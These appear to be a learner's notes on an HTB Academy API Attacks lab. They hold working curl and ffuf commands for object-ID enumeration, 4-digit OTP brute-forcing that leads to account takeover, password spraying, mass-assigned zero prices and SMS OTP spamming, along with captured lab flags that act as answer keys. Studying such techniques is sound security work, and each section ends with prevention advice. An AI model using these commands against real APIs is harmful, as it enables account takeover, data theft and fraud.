# HTB Academy — API Attacks Module Notes

**Module:** API Attacks (Sections 1–13)  
**Topics:** REST API Attacks | OWASP API Top 10 | Auth Bypass | BOLA | Mass Assignment | Rate Limiting | Injection | Security Misconfigurations

---

## General Exercise Methodology

Every exercise in this module follows the same pattern. Do not skip steps or guess — work through this in order every time.

**Step 1 — Read the section material first**
Understand what vulnerability is being demonstrated and what the attack pattern is. The flag is always behind successfully applying that section's technique. Do not reach for tools or endpoints the section hasn't taught yet.

**Step 2 — Sign in and get a JWT**
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')
```
Always use command substitution — never paste a raw JWT into a variable (line wrapping breaks it silently).

**Step 3 — Check roles**
```bash
curl -s -X GET 'http://<TARGET>/api/v1/roles/current-user' \
  -H "Authorization: Bearer $JWT" | jq
```
Role names map exactly to endpoint names. This tells you what you can access.

**Step 4 — Enumerate Swagger for endpoints matching your roles**
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/' | grep -i <keyword>
```
Then get the role and schema for the endpoint you're targeting:
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
```

**Step 5 — Send one test request, read the full response**
Before spamming or looping — send one request with `| jq` and read every field in the response. The flag, sensitive data, or useful info is often in a field you wouldn't notice if you only checked `SuccessStatus`.

**Step 6 — Apply the specific attack the section teaches**
Don't add complexity. The section tells you exactly what to test. Do that one thing.

**Time-saving rules:**
- Always write multi-line scripts to `/tmp/script.sh` and run with `bash` — never paste loops directly into the terminal
- Try customer emails from prior sections first (`MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`, `@pentestercompany.com` for suppliers)
- Error messages reveal required field names — read them before changing anything
- `current-user` endpoints need no role — always try them first after account access

---

## Flags Summary

| Section | Attack | Flag |
|---------|--------|------|
| 3 — BOLA | Enumerate `/api/v1/suppliers/quarterly-reports/{ID}` with integer IDs | `HTB{e76651e1f516eb5d7260621c26754776}` |
| 4 — Broken Authentication | OTP brute-force via password reset flow | `HTB{115a6329120e9eff13c4ec6a63343ed1}` |
| 5 — Excessive Data Exposure | Customer reads `email` from `/api/v1/supplier-companies` | `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}` |
| 5 — Mass Assignment | Set `NetSum: 0` on POST `/api/v1/customers/orders/items` | `HTB{4d86794f82046e465ca29d91bdbe5bca}` |
| 6 — Unrestricted Resource Consumption | Spam SMS OTP endpoint with no rate limiting | `HTB{01de742d8cd942ad682aeea9ce3c5428}` |
| 7 — BFLA | GET `/api/v1/customers/billing-addresses` with no roles | `HTB{1e2095c564baf0d2d316080217040dae}` |
| 8 — Unrestricted Access to Sensitive Business Flows | Filter billing addresses by customer ID from BFLA endpoint | `788 Sauchiehall St.` |

---

## Section 8: Unrestricted Access to Sensitive Business Flows (API6:2023)

### What It Is

An API is vulnerable when it exposes operations or data that allow users to abuse or undermine business logic — e.g., knowing discount schedules to buy low and resell high, or accessing PII that enables targeted attacks. This is distinct from a raw data exposure bug; the harm is the business-level abuse the exposure enables.

- **OWASP:** API6:2023
- Often chained with BFLA or BOLA: the auth bypass creates the exposure, the business flow abuse is the downstream impact

### Scenario in This Section

The BFLA on `/api/v1/products/discounts` (Section 7) exposed discount schedules — enabling an attacker to time bulk purchases during discount windows and resell at full price. The billing addresses BFLA similarly exposes customer PII enabling targeted fraud.

### Attack Pattern

No new attack technique — this section reuses the BFLA vulnerability from Section 7. The question is: given the exposed data, what business harm can be done?

1. Use the BFLA endpoint to retrieve all data
2. Filter for a specific record using jq

### Commands

#### Filter all billing addresses for a specific customer ID
```bash
curl -s 'http://<TARGET>/api/v1/customers/billing-addresses' -H "Authorization: Bearer $JWT" | jq '.customersBillingAddresses[] | select(.customerID == "<ID>")'
```

### Exercise Result

- **Customer ID:** `daa8c984-ba84-4265-8d88-12d6607e511c`
- **Street address:** `788 Sauchiehall St.`
- **City:** Glasgow, UK

### Prevention

Implement strict access controls on endpoints that expose business-sensitive data. Even if a user is authenticated, they should not be able to access data that enables business flow abuse (discount schedules, bulk pricing, competitor pricing, other customers' PII).

---

## Section 7: Broken Function Level Authorization (API5:2023)

### What It Is

BFLA occurs when an API allows unauthorized or unprivileged users to invoke privileged endpoints. Distinct from BOLA: in BOLA the user is authorized to use the endpoint but accesses the wrong object; in BFLA the user has no authorization to use the endpoint at all — the role check simply isn't implemented.

- **CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP:** API5:2023

### Attack Pattern

1. Authenticate → get JWT
2. Check roles (`/api/v1/roles/current-user`) — confirm you have no roles or limited roles
3. Enumerate all endpoints from swagger.json
4. Try every parameterless GET endpoint with your JWT — BFLA endpoints return real data instead of an authorization error
5. Read full responses of endpoints that return data — flag or sensitive info will be embedded

### Commands

#### Probe all parameterless GET endpoints for BFLA
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')
```

Write a loop to `/tmp/bfla.sh`:
```bash
ENDPOINTS=(
  "/api/v1/supplier-companies"
  "/api/v1/supplier-companies/yearly-reports"
  "/api/v1/suppliers"
  "/api/v1/suppliers/quarterly-reports"
  "/api/v1/products"
  "/api/v1/products/discounts"
  "/api/v1/customers"
  "/api/v1/customers/payment-options"
  "/api/v1/customers/orders"
  "/api/v1/customers/billing-addresses"
)

for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s -X GET "http://<TARGET>${ep}" -H "Authorization: Bearer $JWT" | jq -c '.' | head -c 300
  echo
done
```

#### Get full response from a BFLA-vulnerable endpoint
```bash
curl -s -X GET 'http://<TARGET>/api/v1/customers/billing-addresses' -H "Authorization: Bearer $JWT" | jq
```

### What Works

- Script-based enumeration — try all collection GET endpoints; BFLA ones return data, secured ones return an auth error
- Flag is embedded in a data field — pipe through `| jq | grep "HTB"` to find it quickly
- JWT set inside a script subshell does NOT persist to the current shell — always re-authenticate in the current shell before running individual commands

### What Doesn't Work

- Using `$JWT` in the current shell after running it inside a bash script — variable is lost when subshell exits; re-authenticate first

### Exercise Result

- **User:** `htbpentester9@hackthebox.com` — no roles assigned
- **BFLA endpoint (shown in section):** `GET /api/v1/products/discounts` (requires `ProductDiscounts_GetAll`)
- **BFLA endpoint (exercise):** `GET /api/v1/customers/billing-addresses` — returned full customer PII with no role check
- **Flag location:** `street` field of one of the billing address entries
- **Flag:** `HTB{1e2095c564baf0d2d316080217040dae}`

### Prevention

Enforce role-based access control at the source-code level on every endpoint — verify the caller's roles before processing the request, regardless of whether the endpoint is a GET or POST.

---

## Section 6: Unrestricted Resource Consumption (API4:2023)

### What It Is

CWE-400: Uncontrolled Resource Consumption — API fails to limit requests that consume resources (disk, memory, bandwidth, SMS credits, CPU). Without rate limiting, attackers can exhaust resources and cause financial damage or DoS.

Two variants covered in this section:
1. **File upload without size/type validation** — upload arbitrarily large files or executable files; no limit on disk consumption
2. **SMS OTP endpoint without rate limiting** — spam password reset OTPs, burning SMS credits per request

### Attack Pattern — SMS OTP Rate Limit Abuse

1. Sign in → get JWT
2. Check roles and find accessible endpoints
3. Enumerate Swagger for SMS/OTP endpoints — check if role required (often none for password reset flows)
4. Get the request body schema — find required fields
5. Find a valid customer email (try known accounts from prior sections)
6. Send repeated requests in a loop — flag appears after threshold of requests

### Commands

#### Get schema for the OTP command
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 20 "CreatePasswordResetOTPCommand\""
```

#### Test customer emails for validity
```bash
for email in "email1@domain.com" "email2@domain.com"; do
  echo -n "$email: "
  curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/sms-otps' \
    -H 'Content-Type: application/json' \
    -d "{\"Email\": \"$email\"}" | jq -r '.SuccessStatus'
done
```

#### Spam endpoint and detect flag in response
```bash
for i in $(seq 1 100); do
  response=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/sms-otps' \
    -H 'Content-Type: application/json' \
    -d '{"Email": "<VALID_CUSTOMER_EMAIL>"}')
  echo "Request $i: $response"
  echo "$response" | grep -q "HTB{" && echo "FLAG FOUND on request $i!" && break
done
```

### What Works

- Customer emails from prior sections remain valid across exercises — always try them first (`MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`)
- Flag appears embedded in response body after a threshold of requests (not always on request 1)
- Always view full `jq` response first — don't assume `SuccessStatus` is the only field

### What Doesn't Work

- Testing with supplier email on a customer OTP endpoint — returns `SuccessStatus: false`
- Assuming the flag is in the first response — it appeared on request 11

### Exercise Result

- **Endpoint:** `POST /api/v1/authentication/customers/passwords/resets/sms-otps` (no role required)
- **Target email:** `MasonJenkins@ymail.com`
- **Requests sent before flag:** 11
- **Flag:** `HTB{01de742d8cd942ad682aeea9ce3c5428}`

### Prevention

- Implement rate limiting on all endpoints (especially unauthenticated ones like password reset flows)
- Validate file size and extension server-side before saving to disk
- Scan uploaded file contents (e.g., ClamAV) before accepting them
- Restrict public access to file storage directories (don't store uploads under `wwwroot`)
- Enforce authentication and authorization before allowing file access

---

## Section 5: Broken Object Property Level Authorization (API3:2023)

### What It Is

Two subclasses under API3:

1. **Excessive Data Exposure (CWE-213)** — endpoint returns sensitive fields to authorized users who shouldn't be able to see them
2. **Mass Assignment (CWE-915)** — endpoint accepts sensitive fields from clients that should be server-controlled

### Attack Pattern — Excessive Data Exposure

1. Authenticate → get JWT
2. Check roles → identify accessible endpoints
3. Call each GET endpoint → inspect ALL fields in the response
4. Flag is embedded in a sensitive field that shouldn't be exposed to that user's role

### Attack Pattern — Mass Assignment

1. Authenticate → get JWT
2. Check roles → find a POST/PATCH endpoint
3. Check swagger schema for that endpoint's request body — look for fields that should be server-computed (price, totals, status, fee exemptions)
4. Send the request with the sensitive field set to an advantageous value (0, true, etc.)
5. Flag appears in the success response

### Commands

#### Find all endpoint paths containing a keyword
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/' | grep -i <keyword>
```

#### Get the full schema for a command type
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
```

#### Create order (correct path: `/api/v1/customers/orders`)
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')

curl -s -X POST 'http://<TARGET>/api/v1/customers/orders' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $JWT" \
  -d '{"Date": "2026-06-16"}' | jq
```

#### Create order items with mass-assigned NetSum (mass assignment exploit)
```bash
curl -s -X POST 'http://<TARGET>/api/v1/customers/orders/items' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $JWT" \
  -d '{"OrderID": "<ORDER_ID>", "OrderItems": [{"ProductID": "<PRODUCT_ID>", "Quantity": 1, "NetSum": 0}]}' | jq
```
- **`NetSum`** — net total for the item; should be server-computed as `Quantity × UnitPrice` but API accepts it from the client
- **Setting `NetSum: 0`** — orders the product for free; flag returned in success response

### What Works

- Writing Python scripts to `/tmp/` to avoid inline indentation issues with `python3 -c`
- Error messages reveal the required command type name (e.g., `CreateOrderItemsCommand`) and missing fields — read them carefully
- Checking all fields in GET responses, including seemingly internal fields like `email`, `isExemptedFromMarketplaceFee`
- Schema grep with `grep -A 30 "<CommandName>"` to find request body fields including mass-assignable ones
- Listing all relevant paths first: `grep '"/api/' | grep -i <keyword>`

### What Doesn't Work

- `python3 -c "..."` with multiline indented code pasted inline — indentation errors; write to file instead
- Assuming endpoint paths from role names alone — always verify with swagger paths list
- Sending mass-assignable fields at top-level when API expects an array (e.g., `OrderItems` array, not flat fields)
- Grepping swagger for role name alone without finding the schema `$ref` and following it

### Exercise Results

**Q1 — Excessive Data Exposure**
- User: `htbpentester5@hackthebox.com` (customer)
- Roles: `Suppliers_Get`, `Suppliers_GetAll`, `SupplierCompanies_Get`, `SupplierCompanies_GetAll`
- Vulnerable endpoint: `GET /api/v1/supplier-companies`
- Exposed fields: `email`, `isExemptedFromMarketplaceFee` (internal business data, should not be visible to customers)
- Flag: in `email` field of "HTB Academy" company entry → `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}`

**Q2 — Mass Assignment**
- User: `htbpentester7@hackthebox.com` (customer)
- Roles: `CustomerOrders_GetByID`, `CustomerOrders_Create`, `CustomerOrderItems_Get`, `CustomerOrderItems_Create`
- Vulnerable endpoint: `POST /api/v1/customers/orders/items`
- Mass-assignable field: `NetSum` (float) — should be `Quantity × product price`, but API accepts client value
- Exploit: set `NetSum: 0` → ordered a $25.50 product for free
- Flag returned in the `SuccessStatus: true` response → `HTB{4d86794f82046e465ca29d91bdbe5bca}`

### Prevention

- **Excessive Data Exposure:** Return a specific response DTO that includes only fields intended for the caller's role — never return the full domain model
- **Mass Assignment:** Use a dedicated request DTO for each endpoint that excludes fields clients should not control — never bind client input directly to the domain model

---

## Section 2: Introduction to Lab

### Lab Setup

- **Target:** `154.57.164.71:30573`
- **App:** Inlanefreight E-Commerce Marketplace — multi-tenant REST API
- **Swagger UI:** `http://<TARGET>/swagger` — 60+ endpoints across groups: Authentication, Customers, Products, Roles, Supplier-Companies, Suppliers
- **Access control:** RBAC — roles are named identically to the endpoint they grant access to (e.g., `Suppliers_GetAll` → `/api/v1/suppliers`)
- **Account domains:**
  - `@pentestercompany.com` → supplier accounts
  - `@hackthebox.com` → customer accounts

### Commands Introduced

#### Inspect response headers to fingerprint the web server
```bash
curl -si http://<TARGET>/swagger | grep -i "server:"
```
- **What it does:** `-s` silences progress, `-i` includes response headers in output; `grep -i "server:"` isolates the Server header
- **Scenario:** First step on any API — identify the underlying web server (Kestrel = ASP.NET Core, nginx, Apache, etc.)
- **Result here:** `Server: Kestrel` → ASP.NET Core application

#### Enumerate all API endpoints from Swagger JSON
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -i "<keyword>"
```
- **What it does:** Downloads the OpenAPI/Swagger spec as JSON, pretty-prints it, then filters for a keyword
- **Scenario:** When a Swagger UI is exposed — extract endpoint paths, roles required, descriptions, and parameter names without clicking through the UI manually
- **Variations:**
  ```bash
  grep -i "role"      # find all role requirements per endpoint
  grep "/api/v1/"     # list all endpoint paths
  grep "summary"      # list all endpoint summaries
  ```

### Tools Introduced

**Swagger UI** (`/swagger` path)
- Auto-generated API documentation UI — lists all endpoints, parameters, required roles, and allows interactive testing
- When to use: immediately on finding a new API — map the full attack surface before touching any endpoint
- Key value: reveals endpoint paths, HTTP methods, required roles, request/response schemas

**swagger.json / OpenAPI spec** (`/swagger/v1/swagger.json`)
- Machine-readable version of the Swagger UI — easier to grep/parse programmatically
- When to use: when you need to enumerate many endpoints quickly or extract specific info (roles, paths, descriptions) without clicking through the UI

### Answers

| Question | Answer |
|----------|--------|
| Server header | `Kestrel` |
| Only Roles group endpoint | `/api/v1/roles/current-user` |

### Key Observations

- The Roles endpoint (`/api/v1/roles/current-user`) requires **no role** — any authenticated user can call it to see their own assigned roles. Useful for confirming what access a compromised/registered account has.
- Role names mirror endpoint names exactly → the swagger.json description field (`Role(s) required: <b>X</b>`) tells you exactly what role is needed for each endpoint — critical for mapping authorization gaps.

---

## Section 4: Broken Authentication

### What It Is

An API suffers from Broken Authentication if any authentication mechanism can be bypassed or circumvented. This section covers **CWE-307: Improper Restriction of Excessive Authentication Attempts** — no rate limiting on authentication or OTP endpoints allows unlimited brute-force attempts.

- **OWASP:** API2:2023

### Attack Vectors Covered

1. **Password brute-force** — weak password policy (min 6 chars) + no rate limiting = ffuf with wordlist
2. **OTP brute-force** — 4-digit numeric OTP sent via email/SMS with no rate limiting = ffuf with seq-generated list

### Attack Pattern — OTP Reset Flow

1. Authenticate as the provided user to confirm you have API access
2. Check roles — identify what the user can do
3. Trigger OTP for target email: `POST /api/v1/authentication/customers/passwords/resets/email-otps`
4. **Immediately** brute-force OTP: `POST /api/v1/authentication/customers/passwords/resets`
5. Log in as target with new password
6. Access `current-user` endpoint to retrieve their data (no role required)

### Commands

#### Authenticate as customer
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')
```

#### Trigger OTP + brute-force immediately (chain with &&)
```bash
curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/email-otps' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "<TARGET_EMAIL>"}' | jq && \
ffuf -X POST \
  -u 'http://<TARGET>/api/v1/authentication/customers/passwords/resets' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "<TARGET_EMAIL>", "OTP": "FUZZ", "NewPassword": "<NEW_PASS>"}' \
  -w <(seq -w 0 9999):FUZZ \
  -t 10 \
  -mr '"SuccessStatus"\s*:\s*true'
```

- **`<(seq -w 0 9999)`** — process substitution generates 0000–9999 on the fly; avoids file encoding issues that cause silent failures
- **`-t 10`** — lower thread count is more reliable for OTP brute-forcing; 10000 attempts at ~130 req/sec completes in ~77 seconds, well within the 5-minute OTP window
- **`-mr '"SuccessStatus"\s*:\s*true'`** — match regex on success response; more precise than `-fr "false"` which can have edge cases
- **`&&`** — chains trigger + brute-force so ffuf starts immediately after OTP is issued

#### Password brute-force (when password policy is weak)
```bash
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt:PASS \
  -u 'http://<TARGET>/api/v1/authentication/customers/sign-in' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"Email": "<EMAIL>", "Password": "PASS"}' \
  -fr "Invalid Credentials" \
  -t 100
```

- **Scenario:** Weak password policy (min 6 chars, no complexity) + no rate limiting
- **Wordlist path on Pwnbox:** `/usr/share/seclists/Passwords/Common-Credentials/` (NOT `/opt/useful/seclists/`)
- **Available xato lists:** 10, 100, 1000, 10000, 100000, 1000000 entries

#### Access current-user data after account takeover
```bash
curl -s -X GET 'http://<TARGET>/api/v1/customers/payment-options/current-user' \
  -H 'Authorization: Bearer $JWT' | jq
```

- **Key:** `current-user` endpoints use the JWT identity and require **no role** — always try these first after account takeover

### Tools

**ffuf — OTP/password brute-forcing**
- `-w <(seq -w 0 9999):FUZZ` — process substitution wordlist (4-digit OTPs)
- `-mr "regex"` — match response containing regex (use for success detection)
- `-fr "string"` — filter out responses containing string (use for failure filtering)
- `-t 10` — thread count; lower = more reliable for time-sensitive OTP windows

**SecLists wordlist paths on Pwnbox**
```
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt
/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
/usr/share/wordlists/rockyou.txt
```

### What Works

- Process substitution `<(seq -w 0 9999)` for generating OTP wordlist — avoids file encoding issues that silently break matching
- Chaining OTP trigger + ffuf with `&&` — ensures no time is wasted between issuing and brute-forcing
- `-mr` regex matching over `-fr` filtering for precise success detection
- `current-user` endpoints always accessible with just a valid JWT (no role needed)
- Lower thread count (`-t 10`) more reliable than 100 for OTP brute-forcing

### What Doesn't Work

- Hardcoding JWT in variable via terminal paste — line wrapping breaks it silently
- Using file-based OTP wordlist (`/tmp/otps.txt`) — potential encoding issues causing silent failures
- `-fr "false"` as filter — less reliable than `-mr "true"` for this API
- High thread count (`-t 100`) for OTP brute-forcing — may cause race conditions or missed matches
- Running OTP trigger and brute-force as separate manual steps — OTP expires in 5 minutes, delays cause failures

### Prevention

- Implement rate limiting on all authentication endpoints (login, OTP submission, password reset)
- Use cryptographically secure OTPs with high entropy (not 4-digit numeric)
- Enforce strong password policy: min 12 chars, upper/lower/digit/special, no common passwords
- Implement MFA
- Limit OTP attempts (e.g., lock after 5 wrong attempts)

### Exercise Result

- **Target:** `MasonJenkins@ymail.com`
- **OTP:** `2330` (4-digit, found via ffuf with process substitution)
- **Reset password:** `NewP@ssw0rd1`
- **Flag location:** `/api/v1/customers/payment-options/current-user` → `accountNumber` field of Credit Card entry
- **Flag:** `HTB{115a6329120e9eff13c4ec6a63343ed1}`

---

## Section 3: Broken Object Level Authorization (BOLA)

### What It Is

BOLA (= IDOR) occurs when an API endpoint accepts a user-controlled identifier (integer ID, UUID) to retrieve a resource but does **not verify** that the requesting user owns or has permission to access that specific object. Any authenticated user can access any object by changing the ID.

- **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **OWASP:** API1:2023

### Attack Pattern

1. Authenticate → get JWT
2. Check roles (`/api/v1/roles/current-user`) — role name = endpoint name
3. Find the endpoint matching the role in swagger.json — look for integer `{ID}` parameter
4. Enumerate IDs in a loop — access objects belonging to other users/companies

### Commands

#### Authenticate and capture JWT into a variable
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<EMAIL>","password":"<PASS>"}' | jq -r '.jwt')
```
- **What it does:** Authenticates and stores the JWT directly into `$JWT` via command substitution — avoids terminal line-wrapping that breaks hardcoded JWT strings
- **Scenario:** Every API session — always use command substitution, never paste a raw JWT into a variable assignment

#### Enumerate BOLA via integer ID loop
```bash
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    "http://<TARGET>/api/v1/<endpoint>/$i" \
    -H 'accept: application/json' \
    -H "Authorization: Bearer $JWT" | jq
done
```
- **What it does:** Iterates IDs 1–20, fetches each object, pretty-prints with jq
- **When to use:** Any endpoint with an integer `{ID}` path parameter and no apparent ownership enforcement
- **`-w "\n"`** — adds newline after each response for clean output separation
- **`-s`** — silences curl progress meter

#### Full BOLA script (write to file to avoid wrapping issues)
```bash
cat > /tmp/bola.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<EMAIL>","password":"<PASS>"}' | jq -r '.jwt')

for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    "http://<TARGET>/api/v1/<endpoint>/$i" \
    -H 'accept: application/json' \
    -H "Authorization: Bearer $JWT" | jq
done
EOF
bash /tmp/bola.sh
```
- **When to use:** Always write enumeration loops to a file — prevents terminal wrapping from corrupting multi-line commands

#### Decode JWT payload to read roles without an extra API call
```bash
echo '<JWT_MIDDLE_SEGMENT>' | base64 -d 2>/dev/null
```
- **What it does:** Decodes the payload section of the JWT (between the two dots) — reveals roles, email, expiry without hitting the API
- **Scenario:** Quick role check; also useful to confirm JWT expiry (`exp` field)

### Tools Introduced

**jq**
- JSON pretty-printer and parser for the command line
- `| jq` — pretty-print entire response
- `| jq -r '.fieldname'` — extract a specific field as raw string (no quotes)
- **When to use:** Any curl command returning JSON — always pipe through jq for readable output and field extraction

### What Works

- Command substitution for JWT (`JWT=$(curl ... | jq -r '.jwt')`) — reliable, no wrapping issues
- Writing loops to `/tmp/script.sh` and running with `bash` — avoids all terminal paste issues
- Integer ID enumeration on endpoints where role name = `*_GetXByID` pattern

### What Doesn't Work

- Hardcoding a long JWT string in a variable assignment pasted into the terminal — line-wrapping breaks the value silently (script runs but returns nothing)
- Running multi-line loops directly in the terminal when they contain long strings — always write to a file

### Prevention

Endpoint must verify at the source-code level that the `supplierID` on the requested record matches the `supplierID` of the authenticated JWT. If they don't match → deny the request.

### Exercise Result

- **User:** `htbpentester2@pentestercompany.com`
- **Role:** `Suppliers_GetQuarterlyReportByID` → endpoint `/api/v1/suppliers/quarterly-reports/{ID}`
- **Flag location:** ID 8, `commentsFromManager` field, belonging to a different supplier
- **Flag:** `HTB{e76651e1f516eb5d7260621c26754776}`

---

## Section 1: Introduction to API Attacks

### What APIs Are

APIs (Application Programming Interfaces) define rules and protocols for how systems interact — data formatting, access methods, and response structures. Two categories:
- **Public** — accessible to external parties
- **Private** — restricted to specific organizations or internal systems

### API Building Styles

| Style | Description | Key Characteristic |
|-------|-------------|-------------------|
| **REST** | Client-server model, standard HTTP methods (GET/POST/PUT/DELETE) | Stateless; responses in JSON or XML; most popular |
| **SOAP** | XML message exchange | Highly standardized; complex; strong security/transaction features |
| **GraphQL** | Single endpoint, client specifies exact data needed | Flexible; avoids over/under-fetching |
| **gRPC** | Protocol Buffers serialization | High-performance; ideal for microservices |

**This module focuses on REST APIs.** Vulnerabilities demonstrated may also exist in other styles.

### Why APIs Are a Broad Attack Surface

APIs facilitate data exchange across diverse systems — the same properties that make them useful make them exploitable. Key vulnerability classes: sensitive data exposure, auth/authz issues, insufficient rate limiting, improper error handling, security misconfigurations.

### OWASP API Security Top 10 (2023)

| ID | Name | Description |
|----|------|-------------|
| API1 | Broken Object Level Authorization (BOLA) | Authenticated user accesses objects they shouldn't |
| API2 | Broken Authentication | Auth mechanisms can be bypassed |
| API3 | Broken Object Property Level Authorization | Sensitive fields exposed or modifiable by authorized users who shouldn't have access |
| API4 | Unrestricted Resource Consumption | No limits on resources users can consume |
| API5 | Broken Function Level Authorization | Unauthorized users can perform authorized operations |
| API6 | Unrestricted Access to Sensitive Business Flows | Sensitive business flows exposed, enabling financial or other damage |
| API7 | Server Side Request Forgery | API doesn't validate requests → attacker interacts with internal resources |
| API8 | Security Misconfiguration | Includes injection attacks and other misconfigs |
| API9 | Improper Inventory Management | API versions not properly managed or secured |
| API10 | Unsafe Consumption of APIs | API consumes another API unsafely |

**This module covers all 10.**

### No Commands or Tools in This Section

Introductory section only — no tools introduced, no exercise.
